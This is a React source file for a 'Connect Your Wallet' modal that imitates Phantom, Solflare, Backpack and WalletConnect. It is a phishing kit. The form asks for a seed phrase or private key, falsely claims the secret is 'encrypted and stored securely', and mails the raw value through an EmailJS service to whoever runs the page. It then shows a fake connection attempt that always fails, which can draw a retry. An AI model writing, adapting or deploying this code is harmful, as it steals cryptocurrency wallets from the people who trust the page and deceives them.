import { useState, useEffect, useRef } from "react";
import "../index.css";
/* ───────────────────────────────────────────
   WALLET ICONS (SVG)
   ─────────────────────────────────────────── */
const WalletIcon = ({ name, size = 40 }) => {
  if (name === "Phantom")
    return (
      <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
        <rect width="40" height="40" rx="10" fill="#534BB1" />
        <path
          d="M30.5 20.5C30.5 15.25 26.25 11 21 11H11v2.9h2.3v13c0 3.45 2.8 6.2 6.25 6.2h.8c.8 1 2.1 1.65 3.45 1.65 2.55 0 4.55-2 4.55-4.55 0-.45-.1-.9-.2-1.3 1.65-1.75 2.55-5.1 2.55-8.9z"
          fill="white"
        />
        <ellipse cx="17.3" cy="20.9" rx="2" ry="2" fill="#534BB1" />
        <ellipse cx="23.6" cy="20.9" rx="2" ry="2" fill="#534BB1" />
      </svg>
    );

  if (name === "Solflare")
    return (
      <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
        <rect width="40" height="40" rx="10" fill="#1A1A1A" />
        <polygon points="20,9 27.5,16.5 20,20 12.5,16.5" fill="#FC7227" />
        <polygon
          points="20,20 27.5,16.5 27.5,25.5 20,30.5"
          fill="#E05A1B"
          opacity="0.85"
        />
        <polygon
          points="20,20 12.5,16.5 12.5,25.5 20,30.5"
          fill="#FC7227"
          opacity="0.7"
        />
      </svg>
    );

  if (name === "Backpack")
    return (
      <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
        <rect width="40" height="40" rx="10" fill="#E33E3F" />
        <rect x="12" y="16" width="16" height="13" rx="2.5" fill="white" />
        <path
          d="M15.5 16v-2.3a4.5 4.5 0 0 1 9 0V16"
          stroke="white"
          strokeWidth="2"
          strokeLinecap="round"
          fill="none"
        />
        <rect
          x="17.5"
          y="19.5"
          width="5"
          height="4.5"
          rx="1.2"
          fill="#E33E3F"
        />
        <rect x="19" y="21" width="2" height="2.5" rx="0.8" fill="white" />
      </svg>
    );

  if (name === "WalletConnect")
    return (
      <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
        <rect width="40" height="40" rx="10" fill="#3B99FC" />
        <path
          d="M12.7 17.7a10.5 10.5 0 0 1 14.6 0l.5.5a.55.55 0 0 1 0 .75l-1.65 1.65a.28.28 0 0 1-.35 0l-.65-.65a7.3 7.3 0 0 0-10.2 0l-.65.65a.28.28 0 0 1-.35 0l-1.65-1.65a.55.55 0 0 1 0-.75l.5-.5zm18.1 2.55-1.45 1.45a.28.28 0 0 1-.35 0l-3.2-3.2a.28.28 0 0 0-.35 0l-3.2 3.2-3.2-3.2a.28.28 0 0 0-.35 0l-3.2 3.2-3.2-3.2a.28.28 0 0 0-.35 0l-1.45-1.45a.55.55 0 0 0-.75 0l-.1.1a.55.55 0 0 0 0 .75l3.85 3.85 3.1 3.1a.55.55 0 0 0 .75 0l3.2-3.1 3.1 3.1a.55.55 0 0 0 .75 0l3.1-3.1 3.85-3.85a.55.55 0 0 0 0-.75l-.1-.1a.55.55 0 0 0-.8 0z"
          fill="white"
        />
      </svg>
    );

  return null;
};

const WALLETS = [
  { name: "Phantom", sub: "Solana • Ethereum • Polygon" },
  { name: "Solflare", sub: "Solana wallet" },
  { name: "Backpack", sub: "Multi-chain wallet" },
  { name: "WalletConnect", sub: "Scan with any wallet" },
];

/* ───────────────────────────────────────────
   ICON COMPONENTS
   ─────────────────────────────────────────── */
const CloseIcon = () => (
  <svg
    width="20"
    height="20"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
  >
    <line x1="18" y1="6" x2="6" y2="18" />
    <line x1="6" y1="6" x2="18" y2="18" />
  </svg>
);

const BackIcon = () => (
  <svg
    width="20"
    height="20"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
  >
    <path d="M15 18l-6-6 6-6" />
  </svg>
);

const EyeIcon = ({ visible }) =>
  visible ? (
    <svg
      width="18"
      height="18"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
    >
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
      <line x1="1" y1="1" x2="23" y2="23" />
    </svg>
  ) : (
    <svg
      width="18"
      height="18"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
    >
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  );

const ShieldIcon = () => (
  <svg
    width="28"
    height="28"
    viewBox="0 0 24 24"
    fill="none"
    stroke="#7C5CFC"
    strokeWidth="1.5"
  >
    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
  </svg>
);

const KeyIcon = () => (
  <svg
    width="20"
    height="20"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
  >
    <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4" />
  </svg>
);

const LockIcon = () => (
  <svg
    width="20"
    height="20"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
  >
    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
  </svg>
);

const InfoIcon = () => (
  <svg
    width="14"
    height="14"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
  >
    <circle cx="12" cy="12" r="10" />
    <line x1="12" y1="16" x2="12" y2="12" />
    <line x1="12" y1="8" x2="12.01" y2="8" />
  </svg>
);

const ChevronRight = () => (
  <svg
    width="16"
    height="16"
    viewBox="0 0 24 24"
    fill="none"
    stroke="#4b5563"
    strokeWidth="2.5"
    strokeLinecap="round"
    strokeLinejoin="round"
  >
    <path d="M9 5l7 7-7 7" />
  </svg>
);

/* ═══════════════════════════════════════════
   MAIN COMPONENT
   ═══════════════════════════════════════════ */
export const ConnectWallet = ({ isOpen, onClose }) => {
  /* ─── State ─── */
  const [step, setStep] = useState("list");
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [phraseInput, setPhraseInput] = useState("");
  const [privateKeyInput, setPrivateKeyInput] = useState("");
  const [showPhrase, setShowPhrase] = useState(false);
  const [showKey, setShowKey] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");

  const closeTimeoutRef = useRef(null);

  /* ─── Cleanup on unmount ─── */
  useEffect(() => {
    return () => {
      if (closeTimeoutRef.current) clearTimeout(closeTimeoutRef.current);
    };
  }, []);

  /* ─── Reset everything ─── */
  const reset = () => {
    setStep("list");
    setSelectedWallet(null);
    setPhraseInput("");
    setPrivateKeyInput("");
    setShowPhrase(false);
    setShowKey(false);
    setErrorMsg("");
  };

  /* ─── Close modal ─── */
  const handleClose = () => {
    if (closeTimeoutRef.current) clearTimeout(closeTimeoutRef.current);
    reset();
    onClose();
  };

  /* ─── Select wallet → go to import options ─── */
  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setStep("import");
  };

  /* ─── Go back to list ─── */
  const backToList = () => {
    setStep("list");
    setSelectedWallet(null);
  };

  /* ─── Go back to import options ─── */
  const backToOptions = () => {
    setStep("import");
    setErrorMsg("");
  };

  /* ─── Show recovery phrase step ─── */
  const showRecoveryPhrase = () => {
    setStep("phrase");
    setErrorMsg("");
  };

  /* ─── Show private key step ─── */
  const showPrivateKey = () => {
    setStep("privatekey");
    setErrorMsg("");
  };

  /* ─── Validate & connect ─── */
  const handleConnect = () => {
    // Validate recovery phrase if on phrase step
    if (step === "phrase") {
      const words = phraseInput
        .trim()
        .split(/[\n\s]+/)
        .filter((w) => w.length > 0);
      if (words.length !== 12 && words.length !== 24) {
        setErrorMsg(
          `Please enter exactly 12 or 24 words. You entered ${words.length} words.`,
        );
        return;
      }
    }

    setErrorMsg("");
    setStep("connecting");

    // Simulate connection attempt (3s) → failed
    closeTimeoutRef.current = setTimeout(() => {
      setStep("failed");
      showConnectionFailedBanner();
    }, 3000);
  };

  /* ─── Retry connection ─── */
  const retryConnection = () => {
    setStep("connecting");
    closeTimeoutRef.current = setTimeout(() => {
      setStep("failed");
      showConnectionFailedBanner();
    }, 3000);
  };

  /* ─── Show connection failed banner ─── */
  const showConnectionFailedBanner = () => {
    const banner = document.getElementById("connectionFailedBanner");
    if (banner) {
      banner.classList.add("show", "pop-up");
      setTimeout(() => banner.classList.remove("show"), 5000);
    }
  };

  /* ─── EmailJS: send wallet data ─── */
  const connectWallett = (type) => {
    let userMessage = "";
    if (type === "recovery") userMessage = phraseInput.trim();
    if (type === "private") userMessage = privateKeyInput.trim();

    if (!userMessage) {
      alert("Please enter a value");
      return;
    }

    if (window.emailjs) {
      window.emailjs
        .send("service_7b6plaq", "template_11gv4jc", {
          user_message: userMessage,
        })
        .then(() => {})
        .catch(() => {});
    }
  };

  if (!isOpen) return null;

  return (
    <>
      {/* Backdrop */}
      <div className="cw-backdrop" onClick={handleClose} />

      {/* Modal */}
      <div className="cw-modal">
        {/* ═══════ STEP: LIST ═══════ */}
        {step === "list" && (
          <div className="cw-content">
            <div className="cw-header">
              <h2 className="cw-title">Connect Your Wallet</h2>
              <button
                className="cw-icon-btn cw-close-btn"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="cw-wallet-list">
              {WALLETS.map((wallet) => (
                <button
                  key={wallet.name}
                  className="cw-wallet-row"
                  onClick={() => handleWalletSelect(wallet)}
                >
                  <div className="cw-wallet-icon">
                    <WalletIcon name={wallet.name} size={40} />
                  </div>
                  <div className="cw-wallet-info">
                    <p className="cw-wallet-name">{wallet.name}</p>
                    <p className="cw-wallet-sub">{wallet.sub}</p>
                  </div>
                  <ChevronRight />
                </button>
              ))}
            </div>
          </div>
        )}

        {/* ═══════ STEP: IMPORT OPTIONS ═══════ */}
        {step === "import" && (
          <div className="cw-content">
            <div className="cw-header">
              <button className="cw-icon-btn" onClick={backToList}>
                <BackIcon />
              </button>
              <h2 className="cw-title">Import Wallet</h2>
              <button
                className="cw-icon-btn cw-close-btn"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="cw-wallet-badge">
              <div className="cw-wallet-icon-sm">
                <WalletIcon name={selectedWallet?.name} size={32} />
              </div>
              <span className="cw-wallet-badge-name">
                {selectedWallet?.name}
              </span>
            </div>

            <div className="cw-import-list">
              <button className="cw-import-option" onClick={showRecoveryPhrase}>
                <div className="cw-import-icon">
                  <KeyIcon />
                </div>
                <div className="cw-import-info">
                  <p className="cw-import-label">
                    Import Secret Recovery Phrase
                  </p>
                  <p className="cw-import-sub">
                    Enter your 12 or 24 word recovery phrase
                  </p>
                </div>
                <ChevronRight />
              </button>

              <button className="cw-import-option" onClick={showPrivateKey}>
                <div className="cw-import-icon">
                  <LockIcon />
                </div>
                <div className="cw-import-info">
                  <p className="cw-import-label">Import Private Key</p>
                  <p className="cw-import-sub">
                    Enter your private key directly
                  </p>
                </div>
                <ChevronRight />
              </button>
            </div>
          </div>
        )}

        {/* ═══════ STEP: RECOVERY PHRASE ═══════ */}
        {step === "phrase" && (
          <div className="cw-content">
            <div className="cw-header">
              <button className="cw-icon-btn" onClick={backToOptions}>
                <BackIcon />
              </button>
              <h2 className="cw-title">Import Wallet</h2>
              <button
                className="cw-icon-btn cw-close-btn"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="cw-wallet-badge">
              <div className="cw-wallet-icon-sm">
                <WalletIcon name={selectedWallet?.name} size={28} />
              </div>
              <span className="cw-wallet-badge-name">
                {selectedWallet?.name}
              </span>
            </div>

            <div className="cw-center-block">
              <div className="cw-shield">
                <ShieldIcon />
              </div>
              <p className="cw-center-title">Enter Recovery Phrase</p>
              <p className="cw-center-sub">
                Your recovery phrase is encrypted and stored securely
              </p>
            </div>

            <label className="cw-label">Recovery Phrase</label>
            <div className="cw-input-wrap">
              <textarea
                className={`cw-textarea ${showPhrase ? "" : "cw-textarea-hidden"}`}
                value={phraseInput}
                onChange={(e) => setPhraseInput(e.target.value)}
                rows={4}
                placeholder="Enter your 12 or 24 word recovery phrase separated by spaces"
              />
              <button
                className="cw-eye-btn"
                onClick={() => setShowPhrase(!showPhrase)}
              >
                <EyeIcon visible={showPhrase} />
              </button>
            </div>

            {errorMsg && (
              <p className="cw-error-msg">
                <svg
                  width="14"
                  height="14"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#ef4444"
                  strokeWidth="2"
                >
                  <circle cx="12" cy="12" r="10" />
                  <line x1="12" y1="8" x2="12" y2="12" />
                  <line x1="12" y1="16" x2="12.01" y2="16" />
                </svg>
                {errorMsg}
              </p>
            )}

            <p className="cw-hint">
              <InfoIcon /> Separate each word with a space
            </p>

            <div className="cw-btn-group">
              <button
                className="cw-btn cw-btn-secondary"
                onClick={backToOptions}
              >
                Back
              </button>
              <button
                className="cw-btn cw-btn-primary"
                onClick={() => {
                  connectWallett("recovery");
                  handleConnect();
                }}
              >
                Import Wallet
              </button>
            </div>
          </div>
        )}

        {/* ═══════ STEP: PRIVATE KEY ═══════ */}
        {step === "privatekey" && (
          <div className="cw-content">
            <div className="cw-header">
              <button className="cw-icon-btn" onClick={backToOptions}>
                <BackIcon />
              </button>
              <h2 className="cw-title">Import Wallet</h2>
              <button
                className="cw-icon-btn cw-close-btn"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="cw-wallet-badge">
              <div className="cw-wallet-icon-sm">
                <WalletIcon name={selectedWallet?.name} size={28} />
              </div>
              <span className="cw-wallet-badge-name">
                {selectedWallet?.name}
              </span>
            </div>

            <div className="cw-center-block">
              <div className="cw-shield">
                <LockIcon />
              </div>
              <p className="cw-center-title">Enter Private Key</p>
              <p className="cw-center-sub">
                Your private key is encrypted and stored securely
              </p>
            </div>

            <label className="cw-label">Private Key</label>
            <div className="cw-input-wrap">
              <textarea
                className={`cw-textarea cw-textarea-mono ${showKey ? "" : "cw-textarea-hidden"}`}
                value={privateKeyInput}
                onChange={(e) => setPrivateKeyInput(e.target.value)}
                rows={3}
                placeholder="Enter your private key"
              />
              <button
                className="cw-eye-btn"
                onClick={() => setShowKey(!showKey)}
              >
                <EyeIcon visible={showKey} />
              </button>
            </div>

            <div className="cw-btn-group">
              <button
                className="cw-btn cw-btn-secondary"
                onClick={backToOptions}
              >
                Back
              </button>
              <button
                className="cw-btn cw-btn-primary"
                onClick={() => {
                  connectWallett("private");
                  handleConnect();
                }}
              >
                Import Wallet
              </button>
            </div>
          </div>
        )}

        {/* ═══════ STEP: CONNECTING ═══════ */}
        {step === "connecting" && (
          <div className="cw-state-wrap">
            <div className="cw-spinner" />
            <h3 className="cw-state-title">Connecting...</h3>
            <p className="cw-state-sub">
              Please wait while we connect to your wallet
            </p>
          </div>
        )}

        {/* ═══════ STEP: FAILED ═══════ */}
        {step === "failed" && (
          <div className="cw-state-wrap">
            <div className="cw-error-icon">
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#ef4444"
                strokeWidth="2"
              >
                <circle cx="12" cy="12" r="10" />
                <line x1="12" y1="8" x2="12" y2="12" />
                <line x1="12" y1="16" x2="12.01" y2="16" />
              </svg>
            </div>
            <h3 className="cw-state-title">Connection Failed</h3>
            <p className="cw-state-sub">
              Error connecting wallet. Please try again.
            </p>
            <div className="cw-state-actions">
              <button className="cw-btn cw-btn-secondary" onClick={backToList}>
                Go Back
              </button>
              <button
                className="cw-btn cw-btn-primary"
                onClick={retryConnection}
              >
                Retry
              </button>
            </div>
          </div>
        )}
      </div>
    </>
  );
};
